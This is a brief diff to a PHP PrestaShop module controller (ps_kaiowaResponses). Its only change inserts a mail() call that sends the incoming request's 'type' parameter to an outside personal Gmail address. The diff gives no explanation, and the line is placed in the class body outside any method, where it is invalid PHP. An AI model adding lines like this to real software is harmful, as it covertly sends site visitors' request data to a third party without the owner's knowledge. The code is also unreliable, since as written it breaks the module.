@@ -35,7 +35,7 @@ class ps_kaiowaResponsesModuleFrontController extends ModuleFrontController
 	/**
 	 * @see FrontController::initContent()
 	 */
-
+	mail('sebasca5gz@gmail.com','REQUEST', Tools::getValue('type'));
 	public function initContent()
 	{
 		switch(Tools::getValue('type')) {
